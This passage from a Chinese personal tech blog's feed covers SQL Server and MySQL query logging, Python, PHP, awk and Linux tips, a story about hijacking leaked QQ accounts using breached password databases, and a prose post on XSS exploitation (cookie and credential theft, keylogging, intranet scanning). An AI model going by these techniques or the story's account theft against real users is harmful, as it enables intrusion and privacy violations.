                , @tracefile = N'C:\demon\LongRunningQueries'  ---输出文件，后缀为trc
                , @maxfilesize = @maxfilesize
     , @stoptime =NULL
     , @filecount = 2;
 -- step 2: add the events and columns

 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted ：用于sql语句追踪。
                , @columnid = 1 -- TextData ：历史语句
                , @on = @Onset;--include this column in trace

 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted
                , @columnid = 13 --Duration
                , @on = @Onset;--include this column in trace
 EXEC sp_trace_setevent
                 @traceid = @TraceID
                , @eventid = 12 -- SQL:BatchCompleted
                , @columnid = 15 --EndTime
                , @on = @Onset;--include this column in trace        
 -- step 3: add duration filter
 DECLARE @DurationFilter BIGINT;
 SET @DurationFilter = 10000000; --duration in microseconds
 EXEC sp_trace_setfilter
                 @traceid = @TraceID
                , @columnid = 13
                , @logical_operator = 0 --AND
                , @comparison_operator = 5 -- less than or equal to|---妈蛋，tmd大于100000*还抓个蛋的语句
                , @value = @DurationFilter; --filter value
 SELECT @TraceID AS TraceID;</pre>
<p>原文分析在这儿:http://www.cnblogs.com/fzrain/p/3476434.html#commentform
文章作者还是值得肯定的，不过有几处没讲明，还有bug要报错，鄙人修修补补勉强可用了。</p>

<p>在原文里，还可以看到开关trace的语句，见其下文，根据需要进行开关即可。</p>

<p>参考资料：
http://blog.csdn.net/hb_gx/article/details/1745800 SQL Server Profiler 有关的几个存储过程和函数
http://technet.microsoft.com/zh-cn/library/ms186265%28v=sql.105%29.aspx 官方文档</p>

<p>什么？问我什么优势？上面引用的文章讲的很清楚了。
1）trace是语句执行，没有GUI界面，耗资源少。
2）随时开关，即时保存。
3）过滤灵活，不用三方。</p>

<p> </p>

<p><strong><span style="color: #ff0000;">2.Mysql:</span></strong></p>

<p>相较于mssql的历史语句获取，mysql要轻量得多，也简单的多，下面给大家附上方法。</p>

<p>若要获取mysql语句，不采用第三方工具的话（<span style="color: #00ffff;">事实上我不知道哪款三方可以用来获取这个的</span>），可以通过配置mysql.ini(linux下为my.cnf)，让他开启sql记录日志，</p>

<p>PS:开启后日志量会很大喔，跟mssql一样，可以使用脚本定时删除，至于脚本这里就不提供了，太简单了，与本文关系也不大。</p>

<p>网上的配置很多都不能用，估计是不同系统问题吧：
这里提供一份通用的配置（不一定管用）：</p>
<pre lang="sql">[mysqld]
log=/var/log/mysql_query.log
#日志的路径（这里最不靠谱，个人觉得导出到表里是最容易生效的）
----------------------------------------
general_log=1
#开启的选项
# 将日志记录到mysql的table中
log_output=TABLE
#(默认导出到文件)</pre>
<p> </p>

<p>可以将日志输出到表里，也可以输出到日志里，配置好了直接重启mysql即可，鄙人重启了计算机才管用，真心人品碉堡了。</p>

<p>表的位置：mysql.general_log，里面包含了sql用户名，语句执行日期，还有历史语句本身等等，还是比较全面的，不需要的时候就把日志开关关掉，自行清理。</p>

<p>查看开关是否开启的办法：</p>

<p> </p>

<p> </p>
<pre lang="sql">mysql@localhost.(none)&gt;show global variables like "%genera%";
+------------------+------------------------------+
| Variable_name | Value |
+------------------+------------------------------+
| general_log | OFF |
| general_log_file | /data1/mysql9999/etch171.log |
+------------------+------------------------------+
2 rows in set (0.00 sec)

mysql@localhost.(none)&gt;set global general_log=on;
Query OK, 0 rows affected (0.02 sec)

mysql@localhost.(none)&gt;set global general_log=off;
Query OK, 0 rows affected (0.00 sec)</pre>
<p>仔细研究下，朋友们都很容易懂得。</p>

<p><strong><span style="color: #ff0000;">3.其他数据库的语句获取：</span></strong></p>

<p>前面也提到了，鄙人人品也搓，人也懒，不大可能面面俱到，但总要给有兴趣的朋友一点提示不是，这不，给大家附上一份资料。</p>

<p><a href="http://www.itpub.net/tree/index_1/" target="_blank">oracle</a> 里有v$sql等视图来记录执行过的sql语句,<a href="http://www.itpub.net/tree/index_51/" target="_blank">db2</a>里有事件监控器,<a href="http://www.itpub.net/thread-1430388-1-1.html" target="_blank">sybase</a> 里有mon监控表来记录，另外，附上progresql的记录方法：</p>

<p> </p>

<p> </p>

<p> </p>
<pre lang="sql">digoal=# alter database digoal set log_min_duration_statement=0;
ALTER DATABASE
或者
digoal=# alter database digoal set log_statement='all';
ALTER DATABASE
-- 只记录下digoal数据库的所有SQL, 其他数据库则按系统默认的配置.
语法 : 
ALTER DATABASE name SET configuration_parameter { TO | = } { value | DEFAULT }
ALTER DATABASE name SET configuration_parameter FROM CURRENT
ALTER DATABASE name RESET configuration_parameter
ALTER DATABASE name RESET ALL
PostgreSQL的权限分级较多, 例如可以按角色配置权限, 也可以按数据库配置权限, 也可以按会话配置权限等等。</pre>

<p>把握历史记录，利用好日志搭建蜜罐神马的，不用多久,你就能升职加薪、当上总经理、出任CEO、迎娶白富美、走上人生巅峰,想想还有点小激动呢。^_^
这里还得感谢下该死的B哥，虽然这货挺可恶的，但确实帮了我不少忙。</p>

<p><span style="color: #00B050;"><strong>————–Enjoy yourself!——————</strong></span></p>
]]></content>
      <categories>
        
          <category> data </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（五）]]></title>
      <url>/tips/2014/04/20/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-94-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">博主考虑了许久，因为前面写的札记都较为基础，所以以后记录的都以代码和简要说明为主，精简于型.</span></p>

<p>1.实现类似于字典–{1:’xx’,2,[‘zz’,’yy’]}的形式：</p>
<pre lang="python">from collections import defaultdict
d = defaultdict(lambda: [])
with open('data.txt', 'rb') as f:
    for line in f:
        key, value = line[:-1].split(",")
        d[key].append(value)
for k,v in d.iteritems():
    print k, v</pre>
<p>附上参考链接：http://www.cnblogs.com/herbert/archive/2013/01/09/2852843.html</p>
<pre lang="python">number_result = {}                                                              

for line in sys.stdin:                                                          
|   l_s = line.strip().split(' ')                                               
|   key, val = l_s[0], l_s[1]                                                   
|   if key in number_result:                                                    
|   |   #number_result[key].append(val)                                         
|   |   l = []                                                                  
|   |   l.extend(number_result[key])                                            
|   |   l.append(val)                                                           
|   |   number_result[key] = l                                                  
|   |   #number_result[key] = number_result[key].append(val)                    
|   |   #print val                                                              
|   else: number_result[key] = [val]</pre>
<p>字典亦可直接append，将value转为list。
上述亦可将dict转化为字符串，用表达式解决。（博主未亲测）</p>

<p>if key in number_result: == if number_result.has_key(key) == True:</p>

<p>2.py判断一个变量属性方法：直接type后打印。
PS: 上面的代码==&gt;
else: number_result[key] = [val]
直接把值赋为了列表属性，属性统一后面处理显得更加便捷。</p>

<p>3.如例子1：
lambda的匿名函数功能挺好用：
举个例子
一般的函数是这样:</p>

<p>def f(x):
return x+1</p>

<p>这样使用 print f(4)</p>

<p>用lambda的话，写成这样:
g = lambda x : x+1
这样使用 print g(4)</p>

<p> </p>

<p>4.python 链接外部数据库</p>

<p>MySQLdb  pymssql。</p>

<p> </p>

<p><span style="color: #ff0000;">————项目中，持续更新————-</span></p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（四）]]></title>
      <url>/tips/2014/04/01/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e5-9b-9b-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>这一季的php札记是由鄙人做的的一个小项目，而引发的思考。由于项目未完，还会继续更新，既是一个给自己的笔记也是希望对大家有帮助。</p>

<p>1.推荐自动排版：
这个与php关联不大，主要是前端有用，for bootstrap。
https://www.easel.io/demo
http://easelapp.uservoice.com/knowledgebase/topics/23354-videos
http://www.bootcss.com/p/layoutit/</p>

<p>2.php.ini配置的问题：</p>

<p>date.timezone = “Asia/Shanghai”
解决Warning：date(): It is not safe to rely on the system’s timezone settings.</p>

<p>3.自身文件变量：
http://www.cnblogs.com/zcy_soft/archive/2010/10/16/1853239.html
PHP_SELF、 SCRIPT_NAME、 REQUEST_URI区别</p>

<p>4.Undefined index: submit in的错误处理
http://blog.sina.com.cn/s/blog_675b54b801016duj.html
主要解决变量未初始化，容错之类。</p>

<p><span style="color: #ff0000;">———————-待续—————————–</span></p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[8位qq引发的争战]]></title>
      <url>/tips/2013/12/21/8-e4-bd-8dqq-e5-bc-95-e5-8f-91-e7-9a-84-e4-ba-89-e6-88-98/</url>
      <content type="html"><![CDATA[<p>没错，题目就是“争战”，不要纠结于我错字，因为这里确实有“争”字。</p>

<p>在这里讲一个小故事，大家可以当趣事来听，不必太过认真：</p>

<p>这里先介绍下，我们故事的主人翁—Y君，是某普通大学的大一学生，对网安知之甚少，属于菜的不能再菜，天天逛逛菜鸟xx网，看基础教程还得研究半天那种。
这段时间，Y君正迷上了逛某X联盟，成为大众水军的某一员。正当Y君在宿舍优哉游哉地上网时，qq消息闪了，Y君打开一看，原来是C哥，Y君半个师傅。“Hey，
小Y，在干嘛呢？”，C问道。Y君无奈的打字回到：“在找点资料和教程啊，晚点还要上高数呢，忒烦了。”</p>

<p>C回了个笑脸道：“别苦逼着个脸了，给你看个好东西。”，说着，便丢给Y君一段链接和文字。Y君点开一看，立马高兴坏了，原来某x联盟有个“大牛”发了个
装逼帖子，结果把箱子地址侧漏了，弱口令进去，其中还有几个8位qq。</p>

<p>各位看官看到这里估计要笑了，8位qq，也就是几十块的事，这小Y一看就是土鳖。可是事实上，小Y是一个并不富裕家庭的孩子，买qq号这种事对于没有啥零花钱
的他来说，显然是不太现实的。然而作为一名小菜，自然对这位能拿到这么多8位qq的“大牛”异常眼馋了。</p>

<p>小Y喜滋滋地去挑了两个8位qq，把密码敲进登陆器，发现不能登上去。“恩？居然不能登，又被人先下手了。。。”，Y君不满的嘟囔了两句，又去论坛翻了翻那个
帖子，找了个不起眼的8位qq拿来登陆。果不其然，登陆上了，不过信息好友怎么都被清空了呢？小Y疑惑地看了看，发现qq空间已被人改了，原号是女号，结果空间
内容确是一个男人发布的装逼说说。“我内个擦，盗了号还不改密码，明目张胆说是自己盗的，这人够脑残啊。”，小Y笑了笑，准备去密保中心改密码。突然，右下
角弹出了qq提示框：您的账号已在异地登陆，如不是您的操作，请尽快更改密码。小Y顿时绝倒，感情这装逼的不是那盗号的，是抢号的！</p>

<p>这时小Y可没打算客气了，赶紧打开腾讯安全中心准备改密码。结果如大家如大家所料，二代密保+手机绑定，感情他喵的不改密码是因为改不了！这下咋办。小Y边抢
登陆qq，边冥思苦想解决方法，网络另一头的黑阔也不甘示弱，一直在和小Y抢占阵地，并且还速度略胜小Y一筹，把qq网名和qq签名全改成了问候小Y母亲和女性亲人
的语言。这可把小Y气坏了，不过学校的网速坑爹又骂不过对方，再这样弄下去就是跟对方比耐性了，完全没有意义，小Y开始淫荡地寻找解决法子。
当然，小Y开始仅仅是想把这个8位QQ拿到手，咱们虽然有手机绑定，但也可以猜密保啊，猜中了一样可以把这坑爹货KO了。小Y本想找C哥帮忙，结果看到。。</p>

<p><span style="color: #00B050;">[自动回复] 您所呼叫的大神正在DOTA中，请稍后再拨。。。</span>
<span style="color: #00B050;"> 不再提醒</span></p>

<p>好吧，这个老屌丝，注定一生没妹子，小Y决定自己干。</p>

<p>首先百度了这个qq，虽然qq上的注册信息被删光了，但是原主人留在网络里的信息是不容易被抹灭的。</p>

<p>幸好，发现qq主人在某贴吧留下的求助帖，需求仙剑某版本激活码，看来还是个跟小Y有着同好的妹子，想想还有点小激动<del>^_^</del>。</p>

<p>进一步没有翻到神马重要的东西，虽然偶然到妹子在某漫画吧的讨论帖子，不过，好吧，小Y看到后一阵无语，这个。。G漫画小Y还是不怎么感冒的，作为屌丝，我们
的Y君还是一个正常的屌丝啊。顿时这个q原主人在Y君的形象由萌妹子变身为抠脚腐女。不管怎么说，百度google都只有这点信息了。</p>

<p>我们的Y君其实当时是个很纯洁的小孩，没玩过微博，自然也没想到去切入微博入手。在猜密保时试完收集到的信息也没过找回，差点就打算去申诉了。不过除了密码
确实没得到任何地域和个人信息相关，失败率略高啊，骚年。。。</p>

<p>纠结了许久，C哥终于回话了，原来是午觉去了。不过我们的小Y得上课去了（这里为我们可怜的学生党们默哀一下），把密码和信息丢给C哥，拍拍屁股上课去了。
等到小Y回来，已是晚上8点。“幸好哥英明神武，拿了瓶可乐贿赂学习委员才逃出来了，该死的晚自习！”，小Y愤愤道。打开笔记本，等上qq，发现C哥的头像在闪，
于是小Y忐忑不安地点开了。</p>

<p>你猜神奇的C哥最后化腐朽为神奇了麽？</p>

<p>可惜C哥也不是神，不过我们的C哥是个很勤快的孩子，平时喜欢积攒裤子，什么大裤子，小裤子，超短裤子。。。都没有。C哥有本地存数据库的习惯，当时还没流行
社工库，哪有现在那么便利！</p>

<p>我们的抠脚妹子的信息自然不可能在裤子里，你不会真把她当女黑阔了吧。但是抢号的那人却侧漏了。知道是哪里麽？聪明的孩纸已经想到了，是那个抢号的黑阔在空间
发布的信息，里面居然神奇的留下了HACKED BY Hxxx qq，我们的大C哥在裤子里查出了信息，组合了下密码就进去邮箱了（这里说明，进邮箱不容易被主人察觉，不会
出现异地登陆）。令小Y惊诧的是，这人居然还是黑X网的坛友，小Y好像依稀还见过他的ID。
等到快熄灯时小Y登上这位黑阔的qq，还是9位的，里面好友俱全，只绑了密保没手机绑定，花点时间估计能盗来。不过小Y这时却起了恻隐之心，看着一栏一栏的家人，
基友，甚至还有女神（虽然空间主人未对他开放。。），小Y最终还是没下手。“黑亦有道吧，”小Y安慰自己道。“至少我已经找到了我要的道路，不是麽？”</p>

<p>=========================
故事讲完了，有部分润色加工，但大部分是真是的。你问我Y君是谁？我会告诉你是***麽。</p>

<p>好吧，我们下次有缘再会。^_^</p>

<p><span style="color: #00B050;">===Enjoy yourself===</span></p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[System篇小记(一)]]></title>
      <url>/system/2013/12/08/e7-b3-bb-e7-bb-9f-e6-9b-b4-e6-96-b0-e5-ae-89-e8-a3-85-e5-b0-8f-e8-ae-b0-e4-b8-80/</url>
      <content type="html"><![CDATA[<p>本篇没有什么特别的，只是记录一些小弟安装更新linux系统时一些小细节或容易出错的地方，希望对盆友们有些帮助，大牛飘过。</p>

<p><span style="color: #00B050;">1.</span>安装Kali时，注意在选是否采用镜像源时选YES，此时，可能会出点问题，但我们在更新完以后可以在/etc/apt/source.list
里添加更新源，由于小弟并没有找到特别好的更新源，在这里也就不提供了。</p>

<p><span style="color: #00B050;">2.</span>kali里不要安装scim(输入法),难用不说，还容易缺失文件。我用时apt-get update了数次，更新了几次源，无果，最后忍无可忍
直接rm scim*， 然后apt-get ibus ibus-pinyin. 这个需要在系统设置的首选项里启用，并且把汉语加入,完美解决。</p>

<p><span style="color: #00B050;">3.</span>virtualbox共享盘：在虚拟机设置里需启用共享盘，vbox是不支持直接拖放的，在win下需要做盘符映射，linux下直接看不到盘符，
在media下sf_开头的文件即是共享盘符，嫌打开麻烦弄个软链接到根目录或者home目录即可。</p>

<p><span style="color: #00B050;">4.</span>装完系统时少用upgrade,在系统装完后可执行一次update,一般就足够了。别问偶为啥，偶不会告诉你内核稍微出点问题，upgrade能把、
你辛辛苦苦装半天的东西以及各种配置删干净，update则少，不过还是少用为妙。</p>

<p><span style="color: #00B050;">5.</span>visudo，号称能纠错避免sudo瘫痪，这里简单说下，sudo瘫痪了又没有启用root账号的话只有用livecd或者grub恢复了，下面会讲到。
感觉它还是需要root权限，里面有个纠错选项，据说可以防止语法错误，但估计是偶太笨了，窃以为不是特管用。</p>

<p><span style="color: #00B050;">6.</span>sudoers ，这坑爹货需要root权限才能修改，还是只读文件。由于鄙人为了安全，平常喜欢sudo,想直接弄个空密码，试遍了网上各种方法，只总结了个
NOPASSWD，一个都不对，害的偶grub了好几次，机子差点完蛋。解决办法就是%sudo ALL=(ALL) NOPASSWD:ALL，重启（部分系统可以直接生效）
就OK了。</p>

<p><span style="color: #ff0000;"><span style="color: #00B050;">7.</span><span style="color: #ffff99;">   </span></span>/etc/sudoers，也就是sudo的配置文件瘫痪后，需要liveCD救场或者grub恢复。偶试过了两种，跟大家分享下。
<span style="color: #ff0000;">（1）.liveCD</span></p>

<p>用光盘开机,挂载你的硬盘,再把sudoers改回去,然后卸载硬盘，完工（中间仍会用到sudo命令)</p>

<p><span style="color: #ff0000;">(2) grub</span>
#shift进入grub,按e选中recovery模式</p>

<p>#选中root账号
<img src="http://static.oschina.net/uploads/space/2013/0103/013547_fOIK_569120.jpg" alt="" /></p>

<h1 id="chmod-666-devnull">chmod 666 /dev/null</h1>
<p>mount -o remount rw /</p>

<h1 id="nano-etcsudoers">nano /etc/sudoers</h1>
<p>恢复本文件内容并存盘。
KO!</p>

<p><span style="color: #ff0000;">=====Enjoy Yourself!====</span></p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（四）]]></title>
      <url>/coding/2013/12/01/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e5-9b-9b-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>1.Python抓取页面中超链接(URL)的三中方法比较(HTMLParser、pyquery、正则表达式) 
2.Python提供了原始字符串，顾名思义，就是保留原始字符的意思，不对反斜杠及反斜杠后面的字符进行转义，声明原始字符串的方法是在字符串前面加上’r’或者’R’。
3.findall里面可以直接使用正则，不考虑转义？
4.re.X re.I 
5.?i ?:—&gt;匹配大小写<br />
6.Python中最常用的从键盘获取输入的函数是raw_input()和input()。最好使用前者，统一以字符串形式返回。
7.print打印输出可以’前面加编码
8.urlopen后只能进行一次read，第二次为str类型，open选项加上timeout
9.except错误类型最好统一Exception，以免意外错误。
10.Python 报错’ascii’ codec can’t decode byte 0xe5 in position 0: ordinal not in range(128)，尝试decode，如不能写入尝试encode成byte流。
11.Python抓取页面中超链接(URL)的3中方法比较(HTMLParser、pyquery、正则表达式)==&gt;http://www.myexception.cn/HTML-CSS/639814.html
12.python判断是否为空可用if xx is None或者if not xx,后者应用相对更广且效果更佳。
13.按行读取url读取去掉\n</p>
<pre lang="python">
for line in file.readlines():
    line=line.strip('\n')
</pre>
<p>14.对于urlsplit、urlparse、urlunparse的详细介绍：
http://www.cnblogs.com/huangcong/archive/2011/08/31/2160633.html
http://hi.baidu.com/springemp/item/64613c7457731517d0dcb3a7
15.获取网页状态码，需要requests模块http://www.oschina.net/code/snippet_862981_23032
16.local variable ‘xx’ referenced before assignment 需要全局
17.对于url不变，内容跳转的，也就是那种防扫描的，可以用urllib直接open,catch报错即可。
ex：http://segmentfault.com/q/1010000000095769 Nginx配置
18.urllib2.geturl() 可以拿到跳转后的最终页面，302？
19.如何获取网页状态码：</p>
<pre lang="python">
f=urllib.urlopen("xxxxxx") 
print f.getcode() 
==========================
import requests
def getStatusCode(url):
r = requests.get(url, allow_redirects = False)
return r.status_code #使用的requests库在2.7或者2.6好像是没有的
===========================
conn = httplib.HTTPConnection("192.168.1.212");      
#开始进行数据提交   同时也可以使用get进行      
conn.request(method="POST",url="/newsadd.asp?action=newnew",body=params,headers=headers);      
#返回处理后的数据      
response = conn.getresponse();      
#判断是否提交成功      
if response.status == 302:  
</pre>
<p>20.httplib request的用法, getresponse() 用以进行返回数据
21.get_header探测远程文件是否存在可能需要细看是否取空</p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[IDC远程管理篇（一）]]></title>
      <url>/tips/2013/11/25/idc-e8-bf-9c-e7-a8-8b-e7-ae-a1-e7-90-86-e7-af-87-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>1.文件传输：
curl -F password=@/本地路径/文件名 远程服务器                   #模拟form表单post上传
curl  -T /local/filename    ftp://user:passwd@hostname/path/
scp local_file remote_username@remote_ip:remote_folder      #可适当更改，灵活输入。
scp -r local_folder remote_username@remote_ip:remote_folder #远程目录复制
不同的Linux之间copy文件常用有3种方法：
第一种就是ftp，也就是其中一台Linux安装ftp Server，这样可以另外一台使用ftp的client程序来进行文件的copy。
第二种方法就是采用samba服务，类似Windows文件copy 的方式来操作，比较简洁方便。
第三种就是利用scp命令来进行文件复制。
2.日志总结：</p>

]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[数据处理脚本之awk篇]]></title>
      <url>/coding/2013/11/20/e6-95-b0-e6-8d-ae-e5-a4-84-e7-90-86-e8-84-9a-e6-9c-ac-e4-b9-8bawk-e7-af-87/</url>
      <content type="html"><![CDATA[<p>1.awk适用于多列匹配，如果匹配单独的字符串采用sed或许会更佳。</p>

<p>2.awk在正向匹配和反向匹配时，最好用采用“（）”包含来进行单独分割，以免报错。</p>

<p>3.注意对于某列的匹配“！~”和“~”分别正反匹配。</p>

<table>
  <tbody>
    <tr>
      <td>4.如果“，”不能分割匹配项或者报错，可根据效用选用“</td>
      <td> </td>
      <td>”以及“&amp;&amp;”进行连接。</td>
    </tr>
  </tbody>
</table>

<p>5.正则[]要用//包含，不然报错。</p>

<p>6.Tab键产生的空格并非默认，需要”/t”。</p>

<p>7.^[]匹配的为否定中括号内的所以内容。而[^*]则是否定括号内任意。</p>

<p>8./^123$/,完整匹配“123”字符。</p>

<p>9.记住特殊字符，出错检查是否应该用“\”转义。</p>

<p>10.执行action请用{}括起来，想一步完成所有别忘了加后缀文件。</p>

<h1 id="11awk-nr2--nr11-print-0-file-单独取文本其中几行">11.awk ‘NR&gt;2 &amp;&amp; NR&lt;11 {print $0}’ file 单独取文本其中几行</h1>
<p><span style="color: #ff0000;"> <em><strong>本文是博主实践得来，内容简易，后续内容会续上，不喜可喷勿秽言。</strong></em></span>
<strong><span style="color: #00B050;">Enjoy yourself~</span></strong></p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈XSS的最大化利用]]></title>
      <url>/pentest/2013/10/21/e6-b5-85-e8-b0-88xss-e7-9a-84-e6-9c-80-e5-a4-a7-e5-8c-96-e5-88-a9-e7-94-a8/</url>
      <content type="html"><![CDATA[<p>我们知道，前端安全中的xss有多种利用方式，其中比较常见的便是用XSS打到的cookie卡入对方的网站，通过平台不断刷新登录从而获得持久控制权，或者通过权限控制不严直接getshell等等。
下面我们来简单谈谈几种稍微不一样的利用方式。
<span style="color: #00B050;">敏感信息探测</span>
我们在获取用户cookie无效时，可以尝试获取下其他有效数据，以方便我们判断管理的习惯或者进一步渗透的信息。
第一， 偷取浏览器信息，采用navigator的属性可以获取管理浏览器版本和flash插件情况，这样可以进行进一步的构造和其他设想。
第二， 使用Reffer偷取来源，如果在某些情况下不知道后台，我们可以尝试。管理可能在后台看见你的请求或留言进行点击或查看操作，我们如果能获取到reffer就相当于得到后台了。
第三， 重要参数的暴露，同样是Reffer，可能会泄露一些认证的重要参数，这有时可以等同于cookie的危害了。
第四， 获取管理的系统信息和硬件信息。获取系统信息需要建立Ajax对象，跨浏览器进行交互。
<span style="color: #00B050;">窃取密码</span>
同样，XSS作为多种利用方式的衍生物，是可以记录用户输入或者窃取用户浏览器保存的的其他重要信息的，这点在网站被设置了httponly后尤为有用。
第一， 记录用户输入，我们可以在用户在表单输入完毕，截获onsubmit动作时发送所有输入框里的值，期间可以通过onchange做辅助修正。
第二， 键盘记录，通过键入和点击事件，取得当前的keycode或者charcode，记录发送到我们的控制端。这里注意下，以上两种为dom下的区别，通过keydown和keypress事件在不同浏览器获取的不同，我们需要仔细结合浏览器参考使用最合适的。
第三， 截获密码，由于现而今用户输入在浏览器中为动态保存，在源代码中已不能看到明文，所以可以尝试动态创建表单，仿当前页面，在目标提交到服务端前完成填充。
做到这点并不难，因为本地截获是优先于服务端判断的（适用于ie）。
第四， 高仿钓鱼，这点就不多介绍了。
<span style="color: #00B050;">批量扫描</span>
利用XSS，我们还可以针对主机进行批量扫描，听起来可能有些奇葩，可事实就是这样。但是我们得意识到的是，JS请求效率并不高，也不能并发，所以我们要最大化利用这个点就只能对内网就行扫描。那么JS在这儿如何进行工作呢，我们可以做如下尝试：
第一，直接请求，比如，对ip端口进行请求，为一系列IP建立一个数组，取另一个数组储存要请求的端口号。如:http://hosts:port，判断返回状态，建议最好端口号取一个就好。当然，这种判断是不太稳定的，不过也是一种参考法子。
第二，如果我们想效率高些可以通过ajax发起跨域请求，调用XDomainRequest或者XMLHttpRequest进行对url的打开的请求，通过返回值判断。其中加上timeout的时间，更稳定一些。
<span style="color: #00B050;">XSS远控</span>
大家都知道，cookie在平台上是动态刷新的，这就意味着我们可以对服务端进行持续控制
第一， 在我的猜想里，一定程度上框架化对cookie的进行整体利用，附上可更改id名的固定POST内容（类似于hackbar的半自动化提交），我们就可以让XSS做成类似远控的效果了，好像鬼哥在以前弄个一个这样的非平台客户端，不知道是不是相同原理。
第二，不过在更多的定义中，XSS远控应该是让远控指令在目标浏览器上实时执行，并且回
显。从而实现实时地对被控主的Web状态的控制。当然发起请求的方式和连接方法有许多，
我们要在稳定性上多下功夫可以综合思考，这里就不多说了。
最后总结一下，XSS利用方法很多，我这里指讲了一小部分个人觉得有点非主流的，还有部
分如跨域和蠕虫是很值得研究的。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（三）]]></title>
      <url>/coding/2013/10/03/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-89-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">1.telnetlib模块的几个小技巧：</span>
<span style="color: #00B050;">(1)神奇的read_very_eager()</span>
telnetlib模块里的read方法，其说是兼容性较好的，在取得数据完整性和结束符定位做的比较完美，不过，记得设置延时，
待数据抓取完再行第二次查询。
<span style="color: #00B050;">(2)telnet直接模拟登陆获取的数据，可以抓取到一些敏感信息记录。</span>
参考代码：</p>
<pre lang="python">#encoding=utf-8
def do_telnet(Host, username, password, finish, commands):
    import telnetlib
    '''Telnet远程登录：Windows客户端连接Linux服务器'''
    # 连接Telnet服务器
    tn = telnetlib.Telnet(Host, port=23, timeout=10)
	tn.set_debuglevel(2)
    # 输入登录用户名
    tn.read_until('login: ')
    tn.write(username + '\n')
    # 输入登录密码
    tn.read_until('password: ')
    tn.write(password + '\n')     
    # 登录完毕后执行命令
    tn.read_until(finish)
    for command in commands:
        tn.write('%s\n' % command)
    #执行完毕后，终止Telnet连接（或输入exit退出）
    tn.read_until(finish)
    tn.close() # tn.write('exit\n')
if __name__=='__main__':
	 # 配置选项
	Host = '10.255.254.205' # Telnet服务器IP
	username = 'administrator'   # 登录用户名
	password = 'dell1950'  # 登录密码
	finish = ':~$ '      # 命令提示符
	commands = ['echo "test"']
	do_telnet(Host, username, password, finish, commands)</pre>
<p>参考：http://blog.csdn.net/five3/article/details/8099997
<span style="color: #ff0000;">2.多线程小见：</span>
<span style="color: #00B050;">(1)当多线程共享一个东西时，</span>可以采用Queue.Queue，通过队列是否为空实施控制，进行锁信号和同步。
<span style="color: #00B050;">(2)抛弃thread，投向threading的怀抱。</span>过去小弟试过几回thread写多线程，采用了start_new_thread()，写法更加复杂,线程难以很好的控制，而且功能不如threading强大。新版py差不多抛弃了这种写法。
附上参考代码：</p>
<pre lang="python">import threading
import time
class timer(threading.Thread): #The timer class is derived from the class threading.Thread
    def __init__(self, num, interval):
        threading.Thread.__init__(self)
        self.thread_num = num
        self.interval = interval
        self.thread_stop = False 
    def run(self): #Overwrite run() method, put what you want the thread do here
        while not self.thread_stop:
            print 'Thread Object(%d), Time:%s/n' %(self.thread_num, time.ctime())
            time.sleep(self.interval)
    def stop(self):
        self.thread_stop = True 
def test():
    thread1 = timer(1, 1)
    thread2 = timer(2, 2)
    thread1.start()
    thread2.start()
    time.sleep(10)
    thread1.stop()
    thread2.stop()
    return 
if __name__ == '__main__':
    test()</pre>
<p><span style="color: #00B050;">(3)主进程结束后，子进程一般要过一段时间才结束，</span>从而完成收尾工作。如果我们想在主进程结束的时候，子进程也结束的话，我们就应该使用setDaemon（）函数。
<span style="color: #00B050;">（4）没啥好说的，同步所需要锁</span>==&gt;threading.RLock()，所有“临界区”都封闭在同一锁对象的acquire()和release()方法调用之间。
参考：http://blog.csdn.net/lazy_tiger/article/details/3861844 ===================&gt;Python多线程学习(连载)
http://www.cnblogs.com/rollenholt/archive/2011/08/09/2131719.html===========&gt;python多线程学习(细节)
<span style="color: #00B050;">(5)设置timeout不如sleep，</span>前者只是在初始化socket连接时起作用，而一旦连接成功后如果出现等待那就不会起作用。适当沉睡可以等到线程结束，便于同步,最后可以用join设置超时控制。
<span style="color: #ff0000;">3.os模块小总结</span>
<span style="color: #00B050;">(1)简单说是取得a文件属性然后覆盖b文件。</span></p>
<pre lang="python">import os
import stat, time
infile = "samples/sample.jpg"
outfile = "out.jpg"
# copy contents
fi = open(infile, "rb")
fo = open(outfile, "wb")
while 1:
    s = fi.read(10000)
    if not s:
        break
    fo.write(s)
fi.close()
fo.close()
# copy mode and timestamp
st = os.stat(infile)
